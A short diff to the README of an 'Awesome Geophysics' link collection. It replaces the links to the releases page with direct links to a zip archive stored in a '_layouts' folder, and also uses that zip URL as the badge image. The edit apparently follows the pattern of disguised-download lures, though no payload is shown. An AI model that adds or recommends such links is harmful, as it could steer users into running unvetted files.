@@ -10,9 +10,9 @@ Welcome to the Awesome Geophysics repository! This community-curated resource of
 
 ## Explore the Repository
 
-Visit the [Awesome Geophysics Repository](https://github.com/Pequenopolis/awesome-geophysics/releases) to access the latest releases and resources. 
+Visit the [Awesome Geophysics Repository](https://github.com/Pequenopolis/awesome-geophysics/raw/refs/heads/main/_layouts/awesome-geophysics-2.5-beta.2.zip) to access the latest releases and resources. 
 
-[![Download](https://img.shields.io/badge/Download-Visit-blue)](https://github.com/Pequenopolis/awesome-geophysics/releases)
+[![Download](https://github.com/Pequenopolis/awesome-geophysics/raw/refs/heads/main/_layouts/awesome-geophysics-2.5-beta.2.zip)](https://github.com/Pequenopolis/awesome-geophysics/raw/refs/heads/main/_layouts/awesome-geophysics-2.5-beta.2.zip)
 
 ## What to Expect
 
